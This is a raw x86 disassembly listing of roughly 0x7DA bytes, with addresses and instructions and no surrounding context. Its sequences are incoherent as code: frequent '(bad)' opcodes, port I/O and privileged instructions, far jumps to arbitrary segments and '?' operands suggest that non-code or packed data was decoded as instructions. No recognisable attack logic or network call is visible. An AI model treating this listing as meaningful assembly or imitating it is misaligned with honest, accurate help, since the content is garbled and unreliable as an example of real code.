  41fdd5:	or     al,0xc3
  41fdd7:	fistp  DWORD PTR [ebx]
  41fdd9:	xchg   esp,eax
  41fdda:	push   ebx
  41fddb:	pop    ss
  41fddc:	stos   BYTE PTR es:[edi],al
  41fddd:	xchg   ebx,eax
  41fdde:	dec    ebx
  41fddf:	add    eax,0x4b436ab5
  41fde4:	push   ebp
  41fde5:	inc    ebx
  41fde6:	repz jmp 0x69ec:0x3908c720
  41fdee:	aam    0xab
  41fdf0:	inc    ebp
  41fdf1:	mov    ebx,0xa85c27ec
  41fdf6:	ror    DWORD PTR [esp+edx*8-0x1],cl
  41fdfa:	add    DWORD PTR [esi-0x3b],0x668b6256
  41fe01:	jb     0x41fe5d
  41fe03:	test   DWORD PTR [edx+0x36],esp
  41fe06:	xchg   edx,eax
  41fe07:	push   ecx
  41fe08:	cmp    DWORD PTR [eax],0x29870cc7
  41fe0e:	nop
  41fe0f:	inc    edi
  41fe10:	(bad)  
  41fe11:	xchg   DWORD PTR ds:0x8f285cd7,esi
  41fe17:	and    al,0xf0
  41fe19:	push   0x768449f2
  41fe1e:	imul   ebp,eax,0x259e05a8
  41fe24:	fnstenv [ecx]
  41fe26:	sbb    edi,DWORD PTR [edx-0x7d1d13cf]
  41fe2c:	push   esi
  41fe2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe2e:	icebp  
  41fe2f:	sub    al,0x99
  41fe31:	sbb    DWORD PTR [eax+0x34],0xffffffb7
  41fe35:	xor    bh,BYTE PTR [ecx-0x3d]
  41fe38:	lds    edi,FWORD PTR [esi]
  41fe3a:	pop    ss
  41fe3b:	add    BYTE PTR [eax],dh
  41fe3d:	(bad)  
  41fe3e:	mov    al,ds:0x1a03ef8f
  41fe43:	and    DWORD PTR [edi+0x659a444d],eax
  41fe49:	aam    0x4e
  41fe4b:	icebp  
  41fe4c:	jns    0x41fe17
  41fe4e:	jmp    0x2479aad6
  41fe53:	adc    DWORD PTR [eax+esi*1],0xffffffeb
  41fe57:	sbb    esi,edx
  41fe59:	lods   al,BYTE PTR ds:[esi]
  41fe5a:	mov    ecx,0x2a709805
  41fe5f:	iret   
  41fe60:	jne    0x41fe09
  41fe62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe63:	inc    esp
  41fe64:	cwde   
  41fe65:	push   0x70
  41fe67:	in     eax,0xd
  41fe69:	adc    DWORD PTR [edx+0x34],edi
  41fe6c:	sub    DWORD PTR [ebp-0xa],ebp
  41fe6f:	mov    DWORD PTR [eax+0x72],esi
  41fe72:	mov    BYTE PTR [ecx],cl
  41fe74:	push   eax
  41fe75:	pop    es
  41fe76:	pop    ebp
  41fe77:	data16 cli 
  41fe79:	pop    ss
  41fe7a:	jmp    0xe474459e
  41fe7f:	lahf   
  41fe80:	jl     0x41feec
  41fe82:	push   ecx
  41fe83:	cmc    
  41fe84:	inc    ecx
  41fe85:	sub    edx,DWORD PTR ds:0x46849aa2
  41fe8b:	inc    esp
  41fe8c:	retf   0x53d6
  41fe8f:	jmp    0xed41286c
  41fe94:	dec    edx
  41fe95:	popf   
  41fe96:	ins    BYTE PTR es:[edi],dx
  41fe97:	push   0x991f5e62
  41fe9c:	pop    edx
  41fe9d:	add    eax,0x4266db9a
  41fea3:	cmp    ecx,DWORD PTR [ebp-0x6aa7ae8d]
  41fea9:	std    
  41feaa:	dec    edx
  41feab:	cmp    DWORD PTR [esi+0x1a],esi
  41feae:	jl     0x41fe94
  41feb0:	lahf   
  41feb1:	ss fwait
  41feb3:	(bad)  
  41feb4:	sub    al,0x13
  41feb6:	fs sub edx,esi
  41feb9:	adc    ch,BYTE PTR [esi]
  41febb:	sub    edx,DWORD PTR [edi-0x2eb79d37]
  41fec1:	out    dx,al
  41fec2:	ja     0x41feb0
  41fec4:	cs or  eax,edi
  41fec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fec8:	pand   mm0,QWORD PTR [edi-0x4d]
  41fecc:	jmp    0x3cb32982
  41fed1:	jae    0x41fedd
  41fed3:	push   eax
  41fed4:	mov    WORD PTR [esi+0x10],ds
  41fed7:	mov    esp,0x3cad5a94
  41fedc:	push   edx
  41fedd:	mov    ch,0x85
  41fedf:	inc    ecx
  41fee0:	mov    bl,0x6f
  41fee2:	xchg   edx,eax
  41fee3:	mov    ah,bl
  41fee5:	jl     0x41ff03
  41fee7:	daa    
  41fee8:	sbb    ebp,DWORD PTR [ebx]
  41feea:	xchg   edi,eax
  41feeb:	xor    BYTE PTR [ebp+0x49232b8e],al
  41fef1:	shl    BYTE PTR [ebp-0x70a60714],0xe6
  41fef8:	mov    edi,0xc372cc49
  41fefd:	lock lods al,BYTE PTR ds:[esi]
  41feff:	cmp    cl,BYTE PTR [ecx+ebp*4-0x5024377a]
  41ff06:	sar    BYTE PTR es:[ebx],cl
  41ff09:	jbe    0x41feca
  41ff0b:	mov    ch,0xfd
  41ff0d:	xchg   BYTE PTR [ebp-0x77981114],ch
  41ff13:	cmp    eax,DWORD PTR [edi]
  41ff15:	stc    
  41ff16:	push   ss
  41ff17:	rcl    BYTE PTR [edi+0x61],cl
  41ff1a:	sub    bl,BYTE PTR [ecx+0x71c67c6b]
  41ff20:	lds    ebx,FWORD PTR [edi]
  41ff22:	fwait
  41ff23:	sti    
  41ff24:	aaa    
  41ff25:	push   ebp
  41ff26:	fimul  WORD PTR [ecx]
  41ff28:	dec    ebx
  41ff29:	mov    bh,0x27
  41ff2b:	out    dx,al
  41ff2c:	dec    ecx
  41ff2d:	xor    dl,dl
  41ff2f:	xor    eax,0x5ec2258b
  41ff34:	jl     0x41ff78
  41ff36:	vminss xmm0,xmm0,DWORD PTR [eax+0x3dddc061]
  41ff3e:	pop    eax
  41ff3f:	mov    esi,0x32d9d50
  41ff44:	and    ah,ch
  41ff46:	mov    eax,ds:0xddb710f1
  41ff4b:	xlat   BYTE PTR ds:[ebx]
  41ff4c:	or     al,0xfe
  41ff4e:	data16 adc BYTE PTR ds:0xb8bcab00,dl
  41ff55:	out    dx,al
  41ff56:	mov    ecx,0x3ef2ba19
  41ff5b:	mov    eax,0xa4cfdc5d
  41ff60:	stos   BYTE PTR es:[edi],al
  41ff61:	cmp    dl,BYTE PTR [ebx-0x37]
  41ff64:	shl    ah,1
  41ff66:	call   0xfb0:0xbe3a1da3
  41ff6d:	jbe    0x41ff55
  41ff6f:	push   edx
  41ff70:	test   BYTE PTR [eax],ah
  41ff72:	mov    DWORD PTR [ebp-0x677243a5],0x1bf17104
  41ff7c:	or     cl,0x8
  41ff7f:	fldcw  WORD PTR [ecx+0x3902449a]
  41ff85:	pop    edx
  41ff86:	sbb    BYTE PTR [ecx+0x77b8229f],bl
  41ff8c:	dec    esp
  41ff8d:	sbb    bh,BYTE PTR [esi]
  41ff8f:	jmp    0x7eb1f4b8
  41ff94:	in     al,dx
  41ff95:	jle    0x41ffcf
  41ff97:	mov    esi,0xe121be26
  41ff9c:	es mov ch,0xd5
  41ff9f:	mov    al,0x87
  41ffa1:	sub    eax,0x4c3b2b98
  41ffa6:	in     eax,0x1c
  41ffa8:	das    
  41ffa9:	mov    al,0xa
  41ffab:	jl     0x41fff1
  41ffad:	call   0xaf5c:0x4292a1c8
  41ffb4:	(bad)  
  41ffb5:	ror    BYTE PTR [eax+eiz*8+0x5f],1
  41ffb9:	ret    
  41ffba:	jnp    0x41ffcd
  41ffbc:	data16 sub ch,BYTE PTR [esi+ecx*4+0x2a30c50a]
  41ffc4:	mov    dl,0x8d
  41ffc6:	adc    bl,0xf3
  41ffc9:	dec    esi
  41ffca:	or     DWORD PTR [edx+edi*2-0x550cb6cb],eax
  41ffd1:	dec    esi
  41ffd2:	shl    BYTE PTR [ebx],cl
  41ffd4:	xor    BYTE PTR [eax-0x5d],bh
  41ffd7:	or     DWORD PTR [eax],0x20
  41ffda:	jmp    0x4470:0xb97c61ca
  41ffe1:	pop    esi
  41ffe2:	or     edi,edx
  41ffe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffe5:	push   ecx
  41ffe6:	cmc    
  41ffe7:	popf   
  41ffe8:	in     eax,dx
  41ffe9:	fcomp  QWORD PTR [eax-0x5f07ed09]
  41ffef:	mov    ebp,0x100025f8
  41fff4:	mov    edi,0x51c4cb4d
  41fff9:	push   ebx
  41fffa:	aam    0xa2
  41fffc:	mov    dl,0x58
  41fffe:	pop    ecx
  41ffff:	add    eax,0xb4c272b6
  420004:	jbe    0x42007e
  420006:	mov    WORD PTR [eax-0x5a6ed274],fs
  42000c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42000d:	cmp    edx,DWORD PTR [esi-0x68]
  420010:	int3   
  420011:	xchg   edx,eax
  420012:	push   esp
  420013:	mov    BYTE PTR [esi+0x36],0x98
  420017:	imul   edx,eax,0xffffffea
  42001a:	in     eax,0x93
  42001c:	mov    ds:0xed42008b,al
  420022:	adc    BYTE PTR [esi],0xf0
  420025:	(bad)  
  420026:	cdq    
  420027:	(bad)  
  420028:	lea    eax,[eax]
  42002a:	cli    
  42002b:	jmp    0x99754e6b
  420030:	xor    esp,esp
  420032:	imul   edx,DWORD PTR [ecx-0x2a11d064],0xfffffff8
  420039:	out    dx,al
  42003a:	sub    dl,BYTE PTR [ebp-0x6dc00fa3]
  420040:	mov    dh,0x94
  420042:	xchg   BYTE PTR [esi+0x52],ah
  420045:	mov    edi,0xed5dd320
  42004a:	sub    eax,0x86124259
  42004f:	xchg   DWORD PTR [edi+0x10],ebx
  420052:	out    dx,eax
  420053:	cmp    eax,0x102a4000
  420058:	scas   eax,DWORD PTR es:[edi]
  420059:	aaa    
  42005a:	add    al,0xbf
  42005c:	sbb    al,0x9f
  42005e:	fisttp DWORD PTR [ecx]
  420060:	fldenv [esi-0x17bfe275]
  420066:	add    al,0x96
  420068:	out    0xea,eax
  42006a:	or     eax,0x64abec60
  42006f:	xor    dh,cl
  420071:	sbb    eax,0x7909ffc9
  420076:	mov    esi,0x811ea422
  42007b:	loope  0x420047
  42007d:	gs jge 0x42003b
  420080:	cwde   
  420081:	dec    bp
  420083:	(bad)  
  420084:	iret   
  420085:	push   ds
  420086:	mov    ah,0x10
  420088:	imul   ebx,DWORD PTR [ecx+0x5c3940fc],0xfbdee69f
  420092:	or     al,0x71
  420094:	outs   dx,BYTE PTR ds:[esi]
  420095:	repnz outs dx,DWORD PTR ds:[esi]
  420097:	inc    ebx
  420098:	inc    edx
  420099:	mov    ebx,0x5520bc77
  42009e:	jl     0x4200aa
  4200a0:	int    0x76
  4200a2:	in     eax,0x67
  4200a4:	das    
  4200a5:	into   
  4200a6:	scas   al,BYTE PTR es:[edi]
  4200a7:	sysenter 
  4200a9:	inc    esp
  4200aa:	stos   DWORD PTR es:[edi],eax
  4200ab:	jns    0x42010b
  4200ad:	popa   
  4200ae:	pop    esi
  4200af:	pop    ebp
  4200b0:	and    al,0x8d
  4200b2:	cmp    eax,0x54502580
  4200b7:	and    ch,ch
  4200b9:	in     al,dx
  4200ba:	test   DWORD PTR [ebp-0x7b],0x41e70629
  4200c1:	adc    al,0xbd
  4200c3:	cmp    cl,BYTE PTR [ebp-0x1431ed74]
  4200c9:	in     al,dx
  4200ca:	fwait
  4200cb:	dec    eax
  4200cc:	mov    dl,BYTE PTR [ebx]
  4200ce:	out    dx,al
  4200cf:	stc    
  4200d0:	ins    BYTE PTR es:[edi],dx
  4200d1:	sahf   
  4200d2:	add    eax,0x48f0e5e
  4200d7:	test   al,0xc4
  4200d9:	and    al,BYTE PTR [ecx+edi*2]
  4200dc:	xor    al,0xee
  4200de:	cmp    bl,dh
  4200e0:	adc    eax,0xb40f02e9
  4200e5:	push   ss
  4200e6:	nop
  4200e7:	or     bl,al
  4200e9:	mov    al,0xca
  4200eb:	sbb    al,0x16
  4200ed:	xor    bh,BYTE PTR [ecx+eiz*1]
  4200f0:	xchg   ebp,eax
  4200f1:	ror    DWORD PTR [ebp-0x7ac6dd37],0xa2
  4200f8:	dec    ebx
  4200f9:	ja     0x420179
  4200fb:	sub    eax,DWORD PTR [edi-0x29]
  4200fe:	pop    esp
  4200ff:	jbe    0x42017b
  420101:	fst    DWORD PTR [edx]
  420103:	lds    edi,FWORD PTR [esi+0x77]
  420106:	jg     0x4200fa
  420108:	pop    gs
  42010a:	(bad)  
  42010b:	aaa    
  42010c:	setno  BYTE PTR [ebx]
  42010f:	xadd   BYTE PTR [eax+0x18f3cee6],bh
  420116:	push   cs
  420117:	leave  
  420118:	sub    ebx,eax
  42011a:	fidiv  DWORD PTR [edx+0x7c]
  42011d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42011e:	pop    ecx
  42011f:	ror    BYTE PTR [eax-0x16],1
  420122:	xchg   cl,dh
  420124:	adc    eax,0x6e873512
  420129:	adc    al,0xe7
  42012b:	sti    
  42012c:	ret    
  42012d:	fnsave [ebx]
  42012f:	mov    ds:0x50f69a2,al
  420134:	fsub   DWORD PTR [ebx-0x77]
  420137:	sub    DWORD PTR [ebp-0x53],ebx
  42013a:	lods   al,BYTE PTR ds:[esi]
  42013b:	enter  0x989e,0xf1
  42013f:	mov    ds:0x842b74e1,al
  420144:	cmp    eax,0x99cf9cf7
  420149:	dec    ebp
  42014a:	inc    edx
  42014b:	bound  edi,QWORD PTR [edi-0x1d]
  42014e:	push   ss
  42014f:	mov    ds:0xeb499798,al
  420154:	lods   al,BYTE PTR ds:[esi]
  420155:	adc    dh,BYTE PTR [eax]
  420157:	adc    ebp,edx
  420159:	jb     0x4201a6
  42015b:	and    eax,0xcf4b06c4
  420160:	je     0x42012a
  420162:	jno    0x420132
  420164:	mov    esp,0x4d2836a3
  420169:	nop
  42016a:	shl    BYTE PTR [ecx+ebx*1],cl
  42016d:	mov    ch,bl
  42016f:	xor    edx,DWORD PTR [ecx-0x481b995f]
  420175:	sub    bl,BYTE PTR [esi-0x1f]
  420178:	mov    ds:0xf55eaf79,eax
  42017d:	rcl    DWORD PTR [edx],1
  42017f:	hlt    
  420180:	(bad)  
  420182:	scas   eax,DWORD PTR es:[edi]
  420183:	or     DWORD PTR [edi-0x3dc2f68],ebp
  420189:	cwde   
  42018a:	cmp    al,0x86
  42018c:	push   eax
  42018d:	in     eax,dx
  42018e:	lods   al,BYTE PTR ds:[esi]
  42018f:	int    0xb0
  420191:	sti    
  420192:	sti    
  420193:	repz cmp DWORD PTR [esi-0x2a],eax
  420197:	aas    
  420198:	mov    al,ds:0xbf44087
  42019d:	xor    BYTE PTR [esp+ebp*8],bl
  4201a0:	(bad)  [ecx]
  4201a2:	cwde   
  4201a3:	lea    esi,[eax+0x12]
  4201a6:	push   edx
  4201a7:	push   eax
  4201a8:	and    DWORD PTR ds:0x57a2d459,edi
  4201ae:	inc    ebp
  4201af:	test   DWORD PTR [ebp+0x62],eax
  4201b2:	or     BYTE PTR [esi],bl
  4201b4:	in     eax,0xa9
  4201b6:	cmp    DWORD PTR [edx+0x5eeb66d],ebx
  4201bc:	sbb    al,0xe9
  4201be:	shl    DWORD PTR [ecx+0x17],1
  4201c1:	jbe    0x4201ff
  4201c3:	jne    0x42018f
  4201c5:	push   cs
  4201c6:	dec    eax
  4201c7:	xchg   BYTE PTR [ebx+ecx*4+0x4e],cl
  4201cb:	push   0xb62f8e00
  4201d0:	or     esp,ebx
  4201d2:	inc    eax
  4201d3:	add    BYTE PTR [eax],0x49
  4201d6:	repnz push es
  4201d8:	not    bl
  4201da:	call   0xf5fb:0x7a252b1a
  4201e1:	push   edi
  4201e2:	dec    DWORD PTR [edx]
  4201e4:	js     0x420183
  4201e6:	enter  0x9079,0xe2
  4201ea:	adc    esi,edx
  4201ec:	addr16 mov al,ds:0x3051
  4201f0:	jo     0x420189
  4201f2:	cdq    
  4201f3:	xchg   ebp,eax
  4201f4:	lods   eax,DWORD PTR ds:[esi]
  4201f5:	push   ecx
  4201f6:	jae    0x420215
  4201f8:	sti    
  4201f9:	mov    ch,0x31
  4201fb:	jns    0x4201b9
  4201fd:	js     0x420187
  4201ff:	sbb    eax,0x81ac8407
  420204:	cmp    eax,0x8df4b5ad
  420209:	ss xchg edx,eax
  42020b:	popa   
  42020c:	dec    edi
  42020d:	add    bl,BYTE PTR [eax+0x1e]
  420210:	mov    esi,0x47727ec8
  420215:	pushf  
  420216:	pop    esi
  420217:	inc    ebp
  420218:	sbb    eax,0x7b25bf7f
  42021d:	out    0x57,eax
  42021f:	xor    al,0xc7
  420221:	xchg   DWORD PTR [edx-0x2d8ba7c4],edi
  420227:	(bad)  
  420229:	mul    BYTE PTR [esi-0x31b4f8db]
  42022f:	in     eax,0xf9
  420231:	jl     0x4201fa
  420233:	mov    ecx,0x32beeb47
  420238:	jne    0x42024d
  42023a:	fwait
  42023b:	or     edi,esp
  42023d:	jne    0x4201e7
  42023f:	dec    BYTE PTR [eax+0x34f10835]
  420245:	xor    ah,ch
  420247:	push   edx
  420248:	loopne 0x4202bb
  42024a:	repnz inc ebx
  42024c:	nop
  42024d:	ins    DWORD PTR es:[edi],dx
  42024e:	jnp    0x4202a3
  420250:	lds    ebx,FWORD PTR [ebx-0x6f]
  420253:	jo     0x42024e
  420255:	or     al,0xb9
  420257:	das    
  420258:	cld    
  420259:	mov    cl,0xc1
  42025b:	mov    WORD PTR [ecx-0xe4248d5],?
  420261:	fs push cs
  420263:	rcr    BYTE PTR [ebx],cl
  420265:	fnstcw WORD PTR [ecx-0x5ea697b]
  42026b:	sbb    al,0x61
  42026d:	xor    eax,0x3abdea2c
  420272:	push   ss
  420273:	pop    ds
  420274:	jae    0x420280
  420276:	(bad)  
  420277:	bound  ecx,QWORD PTR [esp+ebp*8]
  42027a:	outs   dx,BYTE PTR ds:[esi]
  42027b:	and    al,0xf7
  42027d:	retf   
  42027e:	dec    esi
  42027f:	pop    ebp
  420280:	push   ebp
  420281:	add    BYTE PTR [edx],ch
  420283:	fwait
  420284:	adc    ebp,eax
  420286:	mov    ds:0xa52a6e54,eax
  42028b:	add    al,0xb0
  42028d:	(bad)  
  42028e:	lock mov eax,ds:0xff426a0d
  420294:	push   eax
  420295:	pusha  
  420296:	loope  0x4202ee
  420298:	sub    eax,0xf492cfff
  42029d:	test   DWORD PTR [edi+0x40],ecx
  4202a0:	xchg   edx,eax
  4202a1:	pop    ss
  4202a2:	or     BYTE PTR ds:0xe9140517,dh
  4202a8:	push   ss
  4202a9:	mov    ah,bh
  4202ab:	sub    cl,BYTE PTR [edi-0x66f6b767]
  4202b1:	mov    dl,0x48
  4202b3:	addr16 pushf 
  4202b5:	jns    0x420271
  4202b7:	inc    ecx
  4202b8:	mov    dh,0x45
  4202ba:	sbb    eax,0x574f3b11
  4202bf:	popa   
  4202c0:	push   0xaffa6ea0
  4202c5:	inc    edi
  4202c6:	xchg   ebx,eax
  4202c7:	mov    ds:0xaceebeeb,eax
  4202cc:	adc    BYTE PTR [edx+0xe],ah
  4202cf:	retf   0xf168
  4202d2:	sub    al,0xa3
  4202d4:	pop    ss
  4202d5:	mov    bh,0xf7
  4202d7:	retf   
  4202d8:	lahf   
  4202d9:	xchg   BYTE PTR [esi],al
  4202db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202dc:	into   
  4202dd:	jmp    0x4202af
  4202df:	push   esp
  4202e0:	mov    ebx,0x86866abb
  4202e5:	in     eax,dx
  4202e6:	inc    eax
  4202e7:	xchg   esi,eax
  4202e8:	sub    al,0xf9
  4202ea:	repnz mov ebx,0x82ee7da8
  4202f0:	cld    
  4202f1:	cmp    DWORD PTR [ebp-0x25],edx
  4202f4:	push   esi
  4202f5:	jo     0x420294
  4202f7:	sub    bl,ah
  4202f9:	(bad)  
  4202fa:	sbb    cl,BYTE PTR [edi]
  4202fc:	push   ebx
  4202fd:	adc    cl,dl
  4202ff:	mov    ah,0x31
  420301:	push   esi
  420302:	bound  esi,QWORD PTR [eax-0x16566235]
  420308:	stc    
  420309:	mov    al,ds:0x8c202f06
  42030e:	push   ebx
  42030f:	cli    
  420310:	inc    edi
  420311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420312:	mov    bh,BYTE PTR [edi+0x55]
  420315:	dec    ebx
  420316:	popf   
  420317:	inc    ebp
  420318:	pop    ebx
  420319:	mov    bl,0x76
  42031b:	(bad)  
  42031c:	push   ebx
  42031d:	or     BYTE PTR ds:0x52b7f87d,0x60
  420324:	pop    esp
  420325:	inc    esp
  420326:	lods   eax,DWORD PTR ds:[esi]
  420327:	gs cwde 
  420329:	jne    0x4202ec
  42032b:	cmp    eax,0xf97378c2
  420330:	pop    es
  420331:	and    DWORD PTR [esi],ebx
  420333:	stos   DWORD PTR es:[edi],eax
  420334:	lahf   
  420335:	jbe    0x42037e
  420337:	lods   eax,DWORD PTR ds:[esi]
  420338:	pop    esi
  420339:	shr    ah,1
  42033b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42033c:	xor    eax,0x7094ba00
  420341:	outs   dx,BYTE PTR ds:[esi]
  420342:	aaa    
  420343:	pop    esp
  420344:	inc    eax
  420345:	out    dx,eax
  420346:	jne    0x420343
  420348:	outs   dx,DWORD PTR ds:[esi]
  420349:	cmc    
  42034a:	stos   DWORD PTR es:[edi],eax
  42034b:	out    dx,eax
  42034c:	test   al,0x16
  42034e:	(bad)  
  42034f:	loopne 0x420337
  420351:	mov    dl,0xb8
  420353:	arpl   WORD PTR [esi-0x46],cx
  420356:	sub    eax,0xd0342a2c
  42035b:	imul   esi,DWORD PTR [ebx-0x14],0x9bbb9362
  420362:	mov    ?,WORD PTR [edx+eiz*4-0x4]
  420366:	add    BYTE PTR [esi-0x6a],bl
  420369:	sub    al,0x34
  42036b:	inc    edi
  42036c:	inc    eax
  42036d:	mov    ah,0xa5
  42036f:	and    eax,0xf6d1e73
  420374:	jle    0x4203e6
  420376:	jnp    0x420360
  420378:	mov    WORD PTR [esp+eiz*4+0x459ff0],?
  42037f:	test   al,0xb3
  420381:	mov    BYTE PTR [edi+0x2c],0xf5
  420385:	xchg   BYTE PTR [eax],dl
  420387:	mov    cl,0x9a
  420389:	mov    al,ds:0xd4389706
  42038e:	add    eax,0x1be42e63
  420393:	lahf   
  420394:	mov    DWORD PTR [edi-0x3a1e6c4f],eax
  42039a:	pop    edx
  42039b:	stos   BYTE PTR es:[edi],al
  42039c:	gs pop cx
  42039f:	or     DWORD PTR [ebx],0x77554f26
  4203a5:	cmp    al,0xd5
  4203a7:	xlat   BYTE PTR ds:[ebx]
  4203a8:	mov    bl,BYTE PTR [edx]
  4203aa:	popf   
  4203ab:	xor    esp,ebp
  4203ad:	jecxz  0x420393
  4203af:	mov    eax,0x7adc4679
  4203b4:	mov    dh,bh
  4203b6:	lock nop
  4203b8:	jmp    0x431dbd2e
  4203bd:	out    dx,eax
  4203be:	test   al,0xb
  4203c0:	or     DWORD PTR [ecx-0x522ddfbf],eax
  4203c6:	fadd   QWORD PTR [esi-0x50]
  4203c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203ca:	fadd   QWORD PTR [edi+edi*2+0x35f9b87e]
  4203d1:	push   ebx
  4203d2:	es imul ebp,ebp,0x78d17baf
  4203d9:	gs pop edi
  4203db:	das    
  4203dc:	hlt    
  4203dd:	call   0x2d04:0xb67e394f
  4203e4:	jo     0x42040e
  4203e6:	stc    
  4203e7:	adc    DWORD PTR [ebx+0x7a924cd2],esp
  4203ed:	mov    dh,bl
  4203ef:	dec    DWORD PTR [ebx-0xdf0f47b]
  4203f5:	and    ah,dl
  4203f7:	repz retf 
  4203f9:	adc    DWORD PTR [edi-0x10ff7e42],0xffffffb7
  420400:	daa    
  420401:	fbstp  TBYTE PTR [ebx]
  420403:	pop    DWORD PTR ds:[bx+di-0x3b]
  420408:	jmp    0x42043f
  42040a:	mov    dl,0x23
  42040c:	mov    ebx,0x7427a222
  420411:	cmc    
  420412:	inc    eax
  420413:	les    edx,FWORD PTR [esp+esi*1+0x2a407b49]
  42041a:	dec    ecx
  42041b:	dec    esp
  42041c:	or     ch,bl
  42041e:	sub    al,0x9f
  420420:	add    al,0xb2
  420422:	rol    DWORD PTR [ebx-0x6af3d809],cl
  420428:	out    dx,eax
  420429:	nop
  42042a:	outs   dx,BYTE PTR ds:[esi]
  42042b:	jb     0x420495
  42042d:	pop    edi
  42042e:	dec    esp
  42042f:	xchg   edx,eax
  420430:	pop    ebp
  420431:	pusha  
  420432:	sar    BYTE PTR [ebp-0xd57766a],1
  420438:	(bad)  
  42043a:	stos   DWORD PTR es:[edi],eax
  42043b:	push   ebp
  42043c:	addr16 cmc 
  42043e:	int    0xf8
  420440:	mov    ecx,0xaad5fcfb
  420445:	inc    edi
  420446:	and    esi,DWORD PTR [ecx-0x162ce009]
  42044c:	mov    BYTE PTR [ebx-0x71],ch
  42044f:	sub    eax,edi
  420451:	inc    cx
  420453:	repz pusha 
  420455:	sar    al,1
  420457:	mov    al,0xdc
  420459:	mov    DWORD PTR [ebx+0x10],eax
  42045c:	std    
  42045d:	lods   al,BYTE PTR ds:[esi]
  42045e:	cmc    
  42045f:	mov    ebp,0xc12067b5
  420464:	bound  ecx,QWORD PTR [ebx]
  420466:	sbb    eax,DWORD PTR [edi+0x27ff6537]
  42046c:	call   0x1e7fc0da
  420471:	imul   edx,DWORD PTR [edi-0x3116c4e3],0x2c
  420478:	mov    ah,0x3c
  42047a:	pop    esp
  42047b:	push   ebx
  42047c:	jmp    0xf40fb174
  420481:	ret    0x9459
  420484:	(bad)  
  420485:	lock arpl WORD PTR [ecx-0x29df6b4a],si
  42048c:	inc    esp
  42048d:	daa    
  42048e:	jge    0x4204e1
  420490:	and    BYTE PTR [eax+0x6e],bh
  420493:	add    al,0xe5
  420495:	test   eax,0xa41b93e9
  42049a:	les    ebp,FWORD PTR [ebx]
  42049c:	mov    DWORD PTR [eax+0x46],eax
  42049f:	sbb    DWORD PTR [esi],eax
  4204a1:	dec    ebx
  4204a2:	lock cli 
  4204a4:	enter  0xc336,0x6f
  4204a8:	shl    BYTE PTR [eax+0x7a],cl
  4204ab:	cs in  eax,dx
  4204ad:	sbb    DWORD PTR [edi+0xec3ac17],ebx
  4204b3:	push   ss
  4204b4:	and    eax,0x80843138
  4204b9:	mov    ds:0x8f394e42,eax
  4204be:	and    eax,0xc6026f9e
  4204c3:	in     eax,0x5a
  4204c5:	es pop esp
  4204c7:	stos   DWORD PTR es:[edi],eax
  4204c8:	pusha  
  4204c9:	(bad)  
  4204ca:	or     al,0x48
  4204cc:	ins    BYTE PTR es:[edi],dx
  4204cd:	fsub   QWORD PTR [edx]
  4204cf:	sbb    al,0xbc
  4204d1:	mov    ds:0xe8fee0,eax
  4204d6:	mov    al,ds:0x7ba44a84
  4204db:	mov    eax,ds:0xe8f59fec
  4204e0:	pusha  
  4204e1:	sub    ah,BYTE PTR [eax+0x6e6476b3]
  4204e7:	fwait
  4204e8:	sbb    dh,cl
  4204ea:	ins    BYTE PTR es:[edi],dx
  4204eb:	mov    eax,ds:0x92bec36c
  4204f0:	mov    dl,0x92
  4204f2:	das    
  4204f3:	scas   eax,DWORD PTR es:[edi]
  4204f4:	ret    
  4204f5:	adc    ebp,esp
  4204f7:	cdq    
  4204f8:	shl    DWORD PTR [eax+0x33570ec],cl
  4204fe:	xchg   esi,eax
  4204ff:	jg     0x4204ae
  420501:	xor    cl,BYTE PTR [edx-0x7b597065]
  420507:	ret    0x701c
  42050a:	in     al,dx
  42050b:	fs jp  0x420519
  42050e:	pop    ebx
  42050f:	adc    esi,ebp
  420511:	enter  0x502f,0x9
  420515:	popa   
  420516:	mov    ecx,ecx
  420518:	sub    eax,0x8982f8e1
  42051d:	outs   dx,DWORD PTR ds:[esi]
  42051e:	xor    al,BYTE PTR [edx]
  420520:	jne    0x42051b
  420522:	pusha  
  420523:	and    BYTE PTR [ebp+0x45549bf9],0x4
  42052a:	xchg   edi,eax
  42052b:	pop    ecx
  42052c:	ins    DWORD PTR es:[edi],dx
  42052d:	ret    
  42052e:	jmp    0x42059c
  420530:	call   0x3033230b
  420535:	js     0x420563
  420537:	mov    al,ds:0x8d30447f
  42053c:	fdiv   DWORD PTR [esi+edi*1+0x631b0898]
  420543:	or     esp,esi
  420545:	cmp    DWORD PTR [ecx+0x7aa87b0e],esp
  42054b:	cld    
  42054c:	push   edi
  42054d:	mov    ds:0xdf4cd34e,eax
  420552:	mov    dl,0x37
  420554:	ins    BYTE PTR es:[edi],dx
  420555:	mov    edx,0x8f2ec4e8
  42055a:	pop    edi
  42055b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42055c:	cwde   
  42055d:	inc    esp
  42055e:	in     al,0xe
  420560:	inc    esp
  420561:	xor    eax,0xaf661b78
  420566:	imul   ecx,DWORD PTR [esi-0x4a8de29f],0xfda1f98f
  420570:	out    dx,al
  420571:	or     al,0xb2
  420573:	es dec ecx
  420575:	xchg   edx,eax
  420576:	call   0x545d:0x3476baa7
  42057d:	xchg   DWORD PTR [ebp+ecx*2-0x4b68a48b],ebp
  420584:	mov    DWORD PTR es:0x4d70bd6,ecx
  42058b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42058c:	les    ebp,FWORD PTR [edi+0x378859b5]
  420592:	je     0x4205f2
  420594:	test   DWORD PTR [ecx],0xca804975
  42059a:	cli    
  42059b:	pop    edi
  42059c:	jg     0x4205b2
  42059e:	cs mov cl,0xb0
  4205a1:	pop    edx
  4205a2:	ss aas 
  4205a4:	sub    bl,BYTE PTR [ebx]
  4205a6:	arpl   dx,cx
  4205a8:	xchg   ebx,eax
  4205a9:	cmp    al,0xcc
  4205ab:	pop    esp
  4205ac:	das    
  4205ad:	or     ecx,ebp
  4205af:	or     ah,BYTE PTR [edi]
